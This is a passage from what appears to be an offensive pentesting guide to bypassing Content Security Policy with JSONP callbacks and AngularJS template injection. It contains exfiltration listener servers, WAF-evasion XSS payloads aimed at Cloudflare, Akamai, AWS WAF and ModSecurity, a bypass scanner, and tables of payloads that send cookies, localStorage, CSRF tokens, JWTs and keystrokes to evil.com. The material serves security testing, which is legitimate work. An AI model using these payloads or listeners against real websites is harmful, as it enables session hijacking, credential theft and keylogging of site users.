        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Headers', '*')
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'OK')

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', '*')
        self.end_headers()

    def log_message(self, format, *args):
        pass  # Suppress default logging

PORT = 8443
print(f"[*] Exfiltration server running on port {PORT}")
HTTPServer(('0.0.0.0', PORT), ExfilHandler).serve_forever()
```

:::

:::tabs-item{icon="i-lucide-terminal" label="Node.js"}

```javascript [exfil.js]
const http = require('http');
const url = require('url');
const fs = require('fs');

http.createServer((req, res) => {
  let body = '';
  req.on('data', chunk => body += chunk);
  req.on('end', () => {
    const parsed = url.parse(req.url, true);
    const log = {
      timestamp: new Date().toISOString(),
      method: req.method,
      path: parsed.pathname,
      query: parsed.query,
      body: body || null,
      ip: req.socket.remoteAddress,
      headers: {
        ua: req.headers['user-agent'],
        referer: req.headers['referer'],
        origin: req.headers['origin']
      }
    };
    console.log('\n' + '='.repeat(60));
    console.log(JSON.stringify(log, null, 2));
    fs.appendFileSync('exfil.log', JSON.stringify(log) + '\n');

    res.writeHead(200, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Headers': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS'
    });
    res.end('OK');
  });
}).listen(8443, () => console.log('[*] Exfil server on :8443'));
```

:::

:::tabs-item{icon="i-lucide-terminal" label="Netcat (Quick)"}

```bash [Quick Netcat Listener]
# Simple single-request capture
nc -lvp 8443

# Loop listener
while true; do nc -lvp 8443; done

# With logging
while true; do nc -lvp 8443 | tee -a exfil.log; done

# Python one-liner
python3 -m http.server 8443

# PHP built-in
php -S 0.0.0.0:8443
```

:::

:::tabs-item{icon="i-lucide-cloud" label="Interactsh / Burp"}

```bash [Interactsh]
# Generate unique interaction URL
interactsh-client -v

# Use generated URL in payloads
# Example: abc123.oast.fun
<script src="https://whitelisted.com/api?callback=fetch('https://abc123.oast.fun/?c='.concat(document.cookie))//"></script>

# Burp Collaborator
# Use Collaborator Client in Burp Suite Professional
# Generate payload URL and use in JSONP/Angular payloads
```

:::

::

---

## Phase 7 — WAF and Filter Evasion

### HTML Entity and Encoding Bypasses

::code-collapse

```html [Encoding Bypass Payloads]
<!-- HTML entity encoding -->
<script src="https://whitelisted.com/api?callback=&#97;&#108;&#101;&#114;&#116;(1)//"></script>

<!-- Mixed case -->
<SCRIPT SRC="https://whitelisted.com/api?callback=alert(1)//"></SCRIPT>

<!-- Tab characters in tag -->
<script	src="https://whitelisted.com/api?callback=alert(1)//"></script>

<!-- Newline in tag -->
<script
src="https://whitelisted.com/api?callback=alert(1)//"
></script>

<!-- Forward slash variant -->
<script/src="https://whitelisted.com/api?callback=alert(1)//"></script>

<!-- Null byte injection (legacy) -->
<scr%00ipt src="https://whitelisted.com/api?callback=alert(1)//"></script>

<!-- SVG-based Angular injection -->
<svg><script>alert(1)</script></svg>

<!-- Angular in SVG -->
<svg ng-app><text>{{$on.constructor('alert(1)')()}}</text></svg>

<!-- Angular in math -->
<math ng-app><mtext>{{$on.constructor('alert(1)')()}}</mtext></math>

<!-- Angular with HTML entities in expression -->
<div ng-app>{{$on.constructor('alert(1)')()}}</div>

<!-- Double encoding Angular brackets -->
<div ng-app>%7B%7B$on.constructor('alert(1)')()%7D%7D</div>

<!-- Angular in title/textarea (injection context matters) -->
</title><div ng-app>{{$on.constructor('alert(1)')()}}</div>
</textarea><div ng-app>{{$on.constructor('alert(1)')()}}</div>
```

::

### WAF-Specific Bypass Patterns

::tabs

:::tabs-item{icon="i-lucide-shield" label="Cloudflare"}

```html [Cloudflare WAF Bypasses]
<!-- Angular with Cloudflare bypass -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app>{{'a]'.constructor.constructor('ale'+'rt(1)')()}}</div>

<!-- Cloudflare may block alert but not confirm -->
<div ng-app>{{$on.constructor('confirm(document.domain)')()}}</div>

<!-- Using constructor chain to avoid signatures -->
<div ng-app>{{[].pop['cons'+'tructor'](['ale','rt(','1)'].join(''))()}}</div>

<!-- Using setTimeout -->
<div ng-app>{{$on.constructor('setTimeout(ale'+'rt,0,1)')()}}</div>

<!-- JSONP via Cloudflare whitelisted -->
<script src="https://whitelisted.com/api?callback=set\u0054imeout(alert,0,1)//"></script>
```

:::

:::tabs-item{icon="i-lucide-shield" label="Akamai"}

```html [Akamai WAF Bypasses]
<!-- Akamai Kona bypass patterns -->
<div ng-app>{{$on['const'+'ructor']('ale'+'rt(1)')()}}</div>

<!-- Using atob -->
<div ng-app>{{$on.constructor(atob('YWxlcnQoMSk='))()}}</div>

<!-- Event-based (less likely to trigger WAF) -->
<div ng-app ng-csp>
  <input autofocus ng-focus="$event.view['ale'+'rt'](1)">
</div>

<!-- String manipulation -->
<div ng-app>{{$on.constructor('self'+String.fromCharCode(91)+String.fromCharCode(39)+'alert'+String.fromCharCode(39)+String.fromCharCode(93)+'(1)')()}}</div>
```

:::

:::tabs-item{icon="i-lucide-shield" label="AWS WAF"}

```html [AWS WAF Bypasses]
<!-- AWS WAF bypass patterns -->
<div ng-app>{{$on.constructor('window[`al`+`ert`](1)')()}}</div>

<!-- Template literal obfuscation -->
<div ng-app>{{$on.constructor(`${'al'}${'ert'}(1)`)()}}</div>

<!-- Base64 decode execution -->
<div ng-app>{{$on.constructor('eval(atob(`YWxlcnQoMSk=`))')()}}</div>

<!-- Top-level access -->
<div ng-app>{{$on.constructor('top[`a]l`+`ert`](1)')()}}</div>
```

:::

:::tabs-item{icon="i-lucide-shield" label="ModSecurity CRS"}

```html [ModSecurity CRS Bypasses]
<!-- ModSecurity OWASP CRS bypass -->
<!-- Paranoia Level 1 bypass -->
<div ng-app>{{$on.constructor('this[`al`+`ert`](1)')()}}</div>

<!-- Paranoia Level 2 bypass -->
<div ng-app>{{$on['const\x72uctor']('ale\x72t(1)')()}}</div>

<!-- JSONP with encoding -->
<script src="https://whitelisted.com/api?callback=%61%6c%65%72%74(1)//"></script>

<!-- Comment injection in callback -->
<script src="https://whitelisted.com/api?callback=ale/**/rt(1)//"></script>
```

:::

::

### Angular {{ }} Block Bypass

::code-group

```html [Template Syntax Alternatives]
<!-- If {{ }} is filtered -->
<!-- Use ng-bind -->
<div ng-app><span ng-bind="$on.constructor('alert(1)')()"></span></div>

<!-- Use ng-bind-html -->
<div ng-app><span ng-bind-html="$on.constructor('alert(1)')()"></span></div>

<!-- Use ng-init -->
<div ng-app ng-init="$on.constructor('alert(1)')()"></div>

<!-- Use ng-class -->
<div ng-app><div ng-class="{true:$on.constructor('alert(1)')()}"></div></div>

<!-- Use ng-if -->
<div ng-app><div ng-if="$on.constructor('alert(1)')()"></div></div>

<!-- Use ng-show -->
<div ng-app><div ng-show="$on.constructor('alert(1)')()"></div></div>

<!-- Use ng-repeat -->
<div ng-app><div ng-repeat="x in [$on.constructor('alert(1)')()]"></div></div>

<!-- Use ng-value -->
<div ng-app><input ng-value="$on.constructor('alert(1)')()"></div>

<!-- Use ng-src (triggers on image error) -->
<div ng-app><img ng-src="{{$on.constructor('alert(1)')()}}"></div>

<!-- Use interpolation in attributes -->
<div ng-app><div title="{{$on.constructor('alert(1)')()}}"></div></div>
```

::

---

## Phase 8 — Other Library CSP Bypasses

::note
AngularJS is the most common library for CSP bypass, but other JavaScript frameworks whitelisted via CDN can also be exploited.
::

### Alternative Framework Bypasses

::tabs

:::tabs-item{icon="i-lucide-code" label="Vue.js"}

```html [Vue.js CSP Bypass]
<!-- Vue.js 2.x template injection -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.7.14/vue.js"></script>
<div id="app">{{constructor.constructor('alert(1)')()}}</div>
<script src="https://whitelisted.com/api?callback=new Vue({el:'%23app'})//"></script>

<!-- Vue.js needs el binding — usually requires inline script or JSONP -->
```

:::

:::tabs-item{icon="i-lucide-code" label="Mootools"}

```html [Mootools CSP Bypass]
<!-- Mootools has eval-like capabilities -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://whitelisted.com/api?callback=Fx.Morph.implement({start:Function('alert(1)')})//"></script>
```

:::

:::tabs-item{icon="i-lucide-code" label="Prototype.js"}

```html [Prototype.js CSP Bypass]
<!-- Prototype.js has eval capabilities -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.js"></script>
<script src="https://whitelisted.com/api?callback=alert(1)//"></script>
```

:::

:::tabs-item{icon="i-lucide-code" label="Ember.js"}

```html [Ember.js CSP Bypass]
<!-- Ember Handlebars template injection -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/ember.js/2.18.2/ember.debug.js"></script>
<!-- Ember template injection is more complex and version-dependent -->
```

:::

:::tabs-item{icon="i-lucide-code" label="Dojo"}

```html [Dojo Toolkit CSP Bypass]
<!-- Dojo has require/define that can load arbitrary modules -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/dojo/1.17.3/dojo.js"></script>
<script src="https://whitelisted.com/api?callback=require.rawConfig.baseUrl='https://attacker.com/'//"></script>
```

:::

::

### Google Maps API Callback

```html [Google Maps Callback Bypass]
<!-- Google Maps API uses callback parameter -->
<script src="https://maps.googleapis.com/maps/api/js?callback=alert"></script>

<!-- With cookie exfil -->
<script src="https://maps.googleapis.com/maps/api/js?callback=fetch.bind(null,'https://attacker.com/?c='+document.cookie)"></script>

<!-- Note: Google may restrict some callback patterns -->
```

### Google Tag Manager Abuse

```html [GTM Abuse]
<!-- If GTM is whitelisted, inject a container ID you control -->
<script src="https://www.googletagmanager.com/gtm.js?id=GTM-ATTACKER"></script>
<!-- Your GTM container can contain custom HTML tags with arbitrary JavaScript -->
```

---

## Phase 9 — Tooling & Automation

### Comprehensive CSP Bypass Scanner

```python [csp_bypass_scanner.py]
#!/usr/bin/env python3
"""
CSP Bypass Scanner - JSONP & AngularJS Detection
"""

import requests
import re
import sys
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

ANGULAR_CDNS = {
    'cdnjs.cloudflare.com': 'https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js',
    'cdn.jsdelivr.net': 'https://cdn.jsdelivr.net/npm/angular@1.6.0/angular.min.js',
    'unpkg.com': 'https://unpkg.com/angular@1.6.0/angular.min.js',
    'ajax.googleapis.com': 'https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js',
    'code.angularjs.org': 'https://code.angularjs.org/1.6.0/angular.min.js',
}

JSONP_TESTS = [
    '/o/oauth2/revoke?callback={marker}',
    '/complete/search?client=chrome&q=test&callback={marker}',
    '/api?callback={marker}',
    '/api/v1?callback={marker}',
    '/search?callback={marker}&q=test',
    '/?callback={marker}',
    '/embed?callback={marker}',
    '/oembed?callback={marker}&url=https://example.com',
    '/v1/urls/count.json?url=test&callback={marker}',
]

JSONP_PARAMS = ['callback', 'jsonp', 'cb', 'jsonpcallback', 'jsoncallback', '_callback', 'func']

MARKER = 'CSPbypass7777'

class CSPScanner:
    def __init__(self, url):
        self.url = url
        self.csp = None
        self.domains = []
        self.findings = []

    def get_csp(self):
        try:
            r = requests.get(self.url, timeout=10, allow_redirects=True)
            self.csp = r.headers.get('Content-Security-Policy', '')
            if not self.csp:
                for meta in re.findall(r'<meta[^>]*content-security-policy[^>]*content="([^"]*)"', r.text, re.I):
                    self.csp = meta
                    break
        except Exception as e:
            print(f"[-] Error fetching CSP: {e}")
        return self.csp

    def parse_domains(self):
        if not self.csp:
            return []
        script_src = re.search(r'script-src([^;]*)', self.csp)
        if not script_src:
            script_src = re.search(r'default-src([^;]*)', self.csp)
        if script_src:
            self.domains = re.findall(r'[\w*][\w.-]+\.\w{2,}', script_src.group(1))
        return self.domains

    def check_angular(self, domain):
        for cdn_domain, cdn_url in ANGULAR_CDNS.items():
            if domain == cdn_domain or domain.endswith('.' + cdn_domain) or \
               (domain.startswith('*.') and cdn_domain.endswith(domain[1:])):
                try:
                    r = requests.head(cdn_url, timeout=5)
                    if r.status_code == 200:
                        return cdn_url
                except:
                    pass
        return None

    def check_jsonp(self, domain):
        found = []
        clean = domain.replace('*.', '')
        for path in JSONP_TESTS:
            url = f"https://{clean}{path.format(marker=MARKER)}"
            try:
                r = requests.get(url, timeout=5, allow_redirects=True)
                if f'{MARKER}(' in r.text:
                    found.append(url)
            except:
                pass
        return found

    def check_dangerous_directives(self):
        dangers = []
        if "'unsafe-inline'" in self.csp:
            dangers.append("'unsafe-inline' in script-src")
        if "'unsafe-eval'" in self.csp:
            dangers.append("'unsafe-eval' in script-src")
        if "data:" in self.csp:
            dangers.append("data: URI allowed")
        if "blob:" in self.csp:
            dangers.append("blob: URI allowed")
        if not re.search(r'base-uri', self.csp):
            dangers.append("No base-uri directive (base tag injection possible)")
        if "strict-dynamic" not in self.csp:
            dangers.append("No strict-dynamic (domain whitelist attacks possible)")
        return dangers

    def scan(self):
        print(f"[*] Scanning: {self.url}\n")
        
        csp = self.get_csp()
        if not csp:
            print("[-] No CSP found!")
            return
        
        print(f"[*] CSP: {csp[:200]}...")
        print()
        
        dangers = self.check_dangerous_directives()
        if dangers:
            print("[!] Dangerous Directives:")
            for d in dangers:
                print(f"    ⚠️  {d}")
            print()
        
        domains = self.parse_domains()
        print(f"[*] Whitelisted domains: {', '.join(domains)}\n")
        
        for domain in domains:
            print(f"[*] Checking: {domain}")
            
            angular_url = self.check_angular(domain)
            if angular_url:
                print(f"  [+] AngularJS available: {angular_url}")
                self.findings.append({
                    'type': 'angular',
                    'domain': domain,
                    'url': angular_url
                })
            
            jsonp_urls = self.check_jsonp(domain)
            for url in jsonp_urls:
                print(f"  [+] JSONP endpoint: {url}")
                self.findings.append({
                    'type': 'jsonp',
                    'domain': domain,
                    'url': url
                })
        
        print(f"\n{'='*60}")
        print(f"[*] Total findings: {len(self.findings)}")
        
        if self.findings:
            print("\n[*] Suggested Payloads:\n")
            for f in self.findings:
                if f['type'] == 'angular':
                    print(f'<script src="{f["url"]}"></script>')
                    print(f'<div ng-app>{{{{$on.constructor(\'alert(document.domain)\')()}}}}</div>')
                    print()
                elif f['type'] == 'jsonp':
                    payload_url = f['url'].replace(MARKER, 'alert(document.domain)//')
                    print(f'<script src="{payload_url}"></script>')
                    print()

if __name__ == '__main__':
    scanner = CSPScanner(sys.argv[1])
    scanner.scan()
```

### Burp Suite Workflow

::steps{level="4"}

#### Install Extensions

```text [BApp Store Extensions]
1. CSP Auditor — Passive analysis of CSP headers
2. CSP Bypass — Active testing of CSP weaknesses
3. Retire.js — Detect outdated JS libraries
4. JS Link Finder — Find endpoints in JavaScript
5. Param Miner — Discover hidden parameters
```

#### Configure Scanner

```text [Scanner Configuration]
Target > Scope > Add target domain
Scanner > Live passive scanning > Enable
Extensions > CSP Auditor > Enable all checks
Dashboard > Monitor for CSP-related findings
```

#### Manual Testing in Repeater

```http [JSONP Test Request]
GET /api/endpoint?callback=alert(1)// HTTP/1.1
Host: whitelisted-domain.com
Accept: */*
Referer: https://target.com/
Origin: https://target.com
```

#### Intruder — JSONP Parameter Fuzzing

```text [Intruder Config]
Attack type: Sniper
Payload position: parameter name
Payload list: callback, jsonp, cb, jsonpcallback, jsoncallback, _callback, func, function
Grep match: alert(1)(
```

::

### Nuclei Templates

::code-group

```bash [Run CSP Nuclei Scans]
# CSP detection
nuclei -u https://target.com -tags csp

# Technology detection
nuclei -u https://target.com -tags tech

# Combined scan
nuclei -u https://target.com -tags csp,angular,javascript -severity high,critical

# Custom template
nuclei -u https://target.com -t csp-jsonp-angular.yaml
```

```yaml [csp-jsonp-angular.yaml]
id: csp-jsonp-angular-bypass

info:
  name: CSP JSONP/AngularJS Bypass Detection
  author: pentester
  severity: high
  tags: csp,xss,bypass

http:
  - method: GET
    path:
      - "{{BaseURL}}"
    matchers-condition: and
    matchers:
      - type: regex
        part: header
        regex:
          - "(?i)content-security-policy.*?(cdnjs\\.cloudflare\\.com|cdn\\.jsdelivr\\.net|unpkg\\.com|ajax\\.googleapis\\.com|\\*\\.google\\.com|\\*\\.googleapis\\.com)"
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        part: header
        regex:
          - "content-security-policy: (.*)"
```

::

### dalfox CSP Bypass Mode

```bash [dalfox Commands]
# Basic CSP bypass scan
dalfox url "https://target.com/search?q=test" --csp-bypass

# With WAF evasion
dalfox url "https://target.com/search?q=test" --waf-evasion --csp-bypass

# Pipeline mode
cat urls.txt | dalfox pipe --csp-bypass --silence --only-poc

# With custom payload
dalfox url "https://target.com/search?q=test" --csp-bypass \
  -p '<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script><div ng-app>{{$on.constructor("alert(1)")()}}</div>'

# With Burp proxy
dalfox url "https://target.com/search?q=test" --csp-bypass --proxy http://127.0.0.1:8080
```

---

## Quick Reference

### JSONP Payload Matrix

::collapsible

| Target Domain | JSONP Endpoint | Payload |
| --- | --- | --- |
| `*.google.com` | `/o/oauth2/revoke` | `<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)//">` |
| `*.google.com` | `/complete/search` | `<script src="https://www.google.com/complete/search?client=chrome&q=x&callback=alert(1)//">` |
| `*.googleapis.com` | Maps API | `<script src="https://maps.googleapis.com/maps/api/js?callback=alert">` |
| `*.facebook.com` | Graph API | `<script src="https://graph.facebook.com/?callback=alert(1)//">` |
| Wikipedia | OpenSearch | `<script src="https://en.wikipedia.org/w/api.php?action=opensearch&format=json&callback=alert(1)//&search=x">` |
| Flickr | Feeds | `<script src="https://api.flickr.com/services/feeds/photos_public.gne?format=json&jsoncallback=alert(1)//">` |
| `*.yahoo.com` | Suggest | `<script src="https://search.yahoo.com/sugg/os?callback=alert(1)//&command=x">` |
| GitHub | Gist API | `<script src="https://api.github.com/?callback=alert(1)//">` |
| Pinterest | URL count | `<script src="https://api.pinterest.com/v1/urls/count.json?url=x&callback=alert(1)//">` |

::

### AngularJS Payload Matrix

::collapsible

| Scenario | Angular Version | Payload |
| --- | --- | --- |
| Basic (no sandbox) | >= 1.6.0 | `{{$on.constructor('alert(1)')()}}` |
| Alternative constructor | >= 1.6.0 | `{{constructor.constructor('alert(1)')()}}` |
| Array method | >= 1.6.0 | `{{[].pop.constructor('alert(1)')()}}` |
| String method | >= 1.6.0 | `{{''.trim.constructor('alert(1)')()}}` |
| $watch access | >= 1.6.0 | `{{$watch.constructor('alert(1)')()}}` |
| $root chain | >= 1.6.0 | `{{$root.constructor.constructor('alert(1)')()}}` |
| ng-csp + autofocus | >= 1.6.0 | `<input autofocus ng-focus="$event.composedPath()\|orderBy:'[].constructor.from([1],alert)'">` |
| ng-csp + click | >= 1.6.0 | `<div ng-click="$event.view.alert(1)">click</div>` |
| ng-csp + hover | >= 1.6.0 | `<div ng-mouseover="$event.view.alert(1)">hover</div>` |
| ng-csp + form | >= 1.6.0 | `<form ng-submit="$event.view.alert(1)"><input type=submit></form>` |
| ng-bind (no braces) | >= 1.6.0 | `<span ng-bind="$on.constructor('alert(1)')()">` |
| ng-init | >= 1.6.0 | `<div ng-init="$on.constructor('alert(1)')()">` |
| data- prefix | >= 1.6.0 | `<div data-ng-app>{{$on.constructor('alert(1)')()}}` |
| Sandbox escape | 1.2.x | `{{'a]'.constructor.prototype.charAt=[].join;$eval('x]alert(1)')}}` |
| Sandbox escape | 1.3.x | `{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}` |
| Sandbox escape | 1.4.x | `{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}` |
| Sandbox escape | 1.5.x | `{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}` |
| Obfuscated | >= 1.6.0 | `{{$on.constructor('al'+'ert(1)')()}}` |
| Base64 encoded | >= 1.6.0 | `{{$on.constructor(atob('YWxlcnQoMSk='))()}}` |
| fromCharCode | >= 1.6.0 | `{{$on.constructor(String.fromCharCode(97,108,101,114,116,40,49,41))()}}` |

::

### Exfiltration Payload Matrix

::collapsible

| Data Target | Angular Payload | JSONP Payload |
| --- | --- | --- |
| Cookies | `{{$on.constructor("fetch('https://evil.com/?c='+document.cookie)")()}}` | `callback=fetch('https://evil.com/?c='+document.cookie)//` |
| LocalStorage | `{{$on.constructor("fetch('https://evil.com/?ls='+btoa(JSON.stringify(localStorage)))")()}}` | `callback=fetch('https://evil.com/?ls='+btoa(JSON.stringify(localStorage)))//` |
| DOM HTML | `{{$on.constructor("fetch('https://evil.com/d',{method:'POST',body:document.body.innerHTML})")()}}` | `callback=fetch('https://evil.com/d',{method:'POST',body:document.body.innerHTML})//` |
| CSRF Token | `{{$on.constructor("fetch('https://evil.com/?t='+document.querySelector('[name=csrf]').value)")()}}` | `callback=fetch('https://evil.com/?t='+document.querySelector('[name=csrf]').value)//` |
| URL + Referrer | `{{$on.constructor("fetch('https://evil.com/?u='+location.href+'&r='+document.referrer)")()}}` | `callback=fetch('https://evil.com/?u='+location.href)//` |
| JWT | `{{$on.constructor("fetch('https://evil.com/?j='+localStorage.getItem('token'))")()}}` | `callback=fetch('https://evil.com/?j='+localStorage.getItem('token'))//` |
| Keystrokes | `{{$on.constructor("var k='';document.onkeypress=e=>{k+=e.key;if(k.length>10)fetch('https://evil.com/?k='+k)}")()}}` | `callback=document.onkeypress=function(e){new Image().src='https://evil.com/?k='+e.key}//` |

::

---

## References & Resources

::card-group

::card
---
title: CSP Evaluator
icon: i-simple-icons-google
to: https://csp-evaluator.withgoogle.com/
target: _blank
---
Google's online CSP analysis tool. Paste any CSP to identify weaknesses including JSONP and whitelisted CDN risks.
::

::card
---
title: PortSwigger CSP Bypass
icon: i-simple-icons-portswigger
to: https://portswigger.net/web-security/cross-site-scripting/content-security-policy
target: _blank
---
Comprehensive CSP bypass research and labs from PortSwigger Web Security Academy.
::

::card
---
title: AngularJS Sandbox Escapes
icon: i-simple-icons-angular
to: https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs
target: _blank
---
Gareth Heyes' original research on AngularJS client-side template injection and sandbox escapes.
::

::card
---
title: CSP Bypass - HackTricks
icon: i-lucide-book-open
to: https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html
target: _blank
---
Extensive CSP bypass techniques including JSONP, Angular, and other methods with real-world examples.
::

::card
---
title: JSONP Endpoint Database
icon: i-lucide-database
to: https://github.com/nicoswan/csp-bypass-finder
target: _blank
---
Community-maintained database of JSONP endpoints on commonly whitelisted domains for CSP bypass testing.
::

::card
---
title: Angular CSP Bypass Payloads
icon: i-lucide-swords
to: https://github.com/nicoswan/csp-bypass-finder
target: _blank
---
Curated collection of AngularJS CSP bypass payloads organized by version and technique.
::

::card
---
title: Content Security Policy Reference
icon: i-lucide-shield
to: https://content-security-policy.com/
target: _blank
---
Complete CSP directive reference with examples. Useful for understanding policy structure during analysis.
::

::card
---
title: CSP Is Dead - Google Research
icon: i-simple-icons-google
to: https://research.google/pubs/pub45542/
target: _blank
---
Google research paper "CSP Is Dead, Long Live CSP" demonstrating that 94.72% of real-world CSPs can be bypassed.
::

::card
---
title: Bypass CSP Using WordPress
icon: i-simple-icons-wordpress
to: https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/
target: _blank
---
Technique for bypassing CSP by abusing WordPress JSONP endpoints on whitelisted domains.
::

::card
---
title: dalfox - XSS Scanner
icon: i-lucide-scan
to: https://github.com/hahwul/dalfox
target: _blank
---
Advanced XSS scanner with built-in CSP bypass detection and WAF evasion capabilities.
::

::card
---
title: PayloadsAllTheThings - CSP
icon: i-simple-icons-github
to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#csp-bypass
target: _blank
---
Community payload repository with CSP bypass section containing JSONP, Angular, and CDN abuse payloads.
::

::card
---
title: Mozilla CSP Documentation
icon: i-simple-icons-mozilla
to: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
target: _blank
---
Official MDN documentation for Content Security Policy. Essential reference for understanding directive behavior.
::

::